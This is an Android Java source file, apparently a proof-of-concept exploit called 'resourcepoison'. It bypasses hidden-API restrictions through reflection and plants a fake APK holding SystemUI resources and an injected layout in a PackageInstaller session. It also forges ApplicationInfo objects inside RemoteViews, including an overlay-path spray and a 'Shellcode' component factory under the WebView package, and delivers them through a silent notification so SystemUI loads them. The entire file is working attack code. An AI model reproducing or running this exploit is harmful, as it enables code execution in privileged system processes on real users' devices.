package com.example.resourcepoison;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.util.Property;
import android.view.View;
import android.widget.Button;
import android.widget.RemoteViews;
import android.widget.TextView;

import androidx.annotation.NonNull;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class MainActivity extends Activity {
    static final String TAG = "ResPoison";

    TextView mTextView;
    StringBuilder mTextBuilder = new StringBuilder();
    Button mStartButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mTextView = findViewById(R.id.app_text);
        mStartButton = findViewById(R.id.start_button);
    }

    @Override
    protected void onResume() {
        super.onResume();
        boolean granted = checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        mStartButton.setText(granted ? R.string.start_button : R.string.request_permission);
    }

    public void doStartStuff(View view) throws Exception {
        if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
            return;
        }
        doStartStuff();
    }

    @SuppressLint({"ResourceType", "BlockedPrivateApi", "DiscouragedPrivateApi"})
    public void doStartStuff() throws Exception {
        allowHiddenApis();
        mStartButton.setEnabled(false);

        // Write into directory readable by SystemUI
        PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
        int sessionId = packageInstaller.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));
        PackageInstaller.Session session = packageInstaller.openSession(sessionId);
        try (ZipOutputStream outputStream = new ZipOutputStream(session.openWrite("fake.apk", 0, -1))) {
            try (ZipFile zipFile = new ZipFile(getPackageManager().getApplicationInfo("com.android.systemui", 0).sourceDir); InputStream inputStream = zipFile.getInputStream(zipFile.getEntry("resources.arsc"))) {
                writeZipEntry(outputStream, "resources.arsc", inputStream.readAllBytes());
            }
            try (InputStream inputStream = getResources().openRawResource(R.layout.injected_layout)) {
                writeZipEntry(outputStream, "res/layout/slice_permission_request.xml", inputStream.readAllBytes());
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        String newApkPath = "/data/app/vmdl" + sessionId + ".tmp/fake.apk";

        // Create RemoteViews pointing to new APK
        ApplicationInfo appInfo = new ApplicationInfo(getPackageManager().getApplicationInfo("com.android.systemui", 0));
        appInfo.sourceDir = newApkPath;
        RemoteViews injRemoteViews = wrapAppInfoRemoteViews(appInfo);

        appInfo = new ApplicationInfo(getApplicationInfo());
        appInfo.packageName += "_spray";
        ApplicationInfo.class.getDeclaredField("resourceDirs").set(appInfo, null);
        ApplicationInfo.class.getDeclaredField("overlayPaths").set(appInfo, generateOverlayNames(20000));
        RemoteViews injRemoteViews2 = wrapAppInfoRemoteViews(appInfo);

        appInfo = new ApplicationInfo(getApplicationInfo());
        appInfo.packageName = getWebViewPackage();
        appInfo.appComponentFactory = Shellcode.class.getName();
        RemoteViews injRemoteViews3 = wrapAppInfoRemoteViews(appInfo);

        // Wrap
        RemoteViews remoteViews = new RemoteViews(getPackageName(), R.layout.rv_layout);
        remoteViews.addView(R.id.rv_container, injRemoteViews);
        remoteViews.addView(R.id.rv_container, injRemoteViews2);
        remoteViews.setImageViewUri(R.id.rv_image, Uri.parse("content://com.example.resourcepoison.provider/sem1"));
        remoteViews.addView(R.id.rv_container, injRemoteViews3);

        // Proceed to step 2 after icon is accessed
        Provider.sOpenCallback = () -> {
            log("Starting Activity");
            Provider.sOpenCallback = null;
            runOnUiThread(() -> {
                startActivity(
                        new Intent("com.android.intent.action.REQUEST_SLICE_PERMISSION")
                                .setClassName("com.android.systemui", "com.android.systemui.SlicePermissionActivity")
                                .putExtra("slice_uri", Uri.parse("content://com.android.settings.slices/action/mobile_data"))
                                .putExtra("pkg", getPackageName())
                );
            });
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
            log("End of sleep");
        };
        Provider.sReportCallback = s -> runOnUiThread(() -> {
            log(s);
            mStartButton.setEnabled(true);
        });

        // Post IMPORTANCE_MIN Notification with bigContentView
        // so RemoteViews get quietly applied within SystemUI
        NotificationManager nm = getSystemService(NotificationManager.class);
        nm.createNotificationChannel(new NotificationChannel("channel", "Main", NotificationManager.IMPORTANCE_MIN));
        Notification n = new Notification.Builder(this, "channel").build();
        n.icon = android.R.drawable.ic_menu_revert;
        n.bigContentView = remoteViews;

        log("Posting notification (this step will take some time)");
        nm.notify(1, n);
    }

    void writeZipEntry(ZipOutputStream zipOutputStream, String fileName, byte[] data) throws IOException {
        ZipEntry e = new ZipEntry(fileName);
        e.setMethod(ZipEntry.STORED);
        e.setSize(data.length);
        CRC32 crc32 = new CRC32();
        crc32.update(data);
        e.setCrc(crc32.getValue());
        zipOutputStream.putNextEntry(e);
        zipOutputStream.write(data);
    }

    @NonNull
    private RemoteViews wrapAppInfoRemoteViews(ApplicationInfo appInfo) throws ReflectiveOperationException {
        ApplicationInfo.class.getDeclaredField("scanSourceDir").set(appInfo, "/dev/random");
        ApplicationInfo.class.getDeclaredField("createTimestamp").setLong(appInfo, Long.MAX_VALUE);
        RemoteViews rv = new RemoteViews(getPackageName(), android.R.layout.simple_list_item_1);
        RemoteViews.class.getDeclaredField("mApplication").set(rv, appInfo);
        return rv;
    }

    private String getWebViewPackage() throws ReflectiveOperationException {
        Object service = Class.forName("android.webkit.WebViewFactory").getMethod("getUpdateService").invoke(null);
        Object provider = service.getClass().getMethod("waitForAndGetProvider").invoke(service);
        PackageInfo packageInfo = (PackageInfo) provider.getClass().getField("packageInfo").get(provider);
        return packageInfo.packageName;
    }

    static String[] generateOverlayNames(int amount) {
        String[] result = new String[amount];
        for (int i = 0; i < amount; i++) {
            result[i] = "pp" + i;
        }
        return result;
    }

    void log(String message) {
        Log.v(TAG, message);
        runOnUiThread(() -> {
            mTextBuilder.append(message).append('\n');
            mTextView.setText(mTextBuilder);
        });
    }

    private static boolean sAllowHiddenApisDone;

    public static void allowHiddenApis() {
        if (sAllowHiddenApisDone) return;
        try {
            Method[] methods = Property.of(Class.class, Method[].class, "Methods").get(Class.forName("dalvik.system.VMRuntime"));
            Method setHiddenApiExemptions = null;
            Method getRuntime = null;
            for (Method method : methods) {
                if ("setHiddenApiExemptions".equals(method.getName())) {
                    setHiddenApiExemptions = method;
                }
                if ("getRuntime".equals(method.getName())) {
                    getRuntime = method;
                }
            }
            setHiddenApiExemptions.invoke(getRuntime.invoke(null), new Object[]{new String[]{"L"}});
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException(e);
        }
        sAllowHiddenApisDone = true;
    }
}
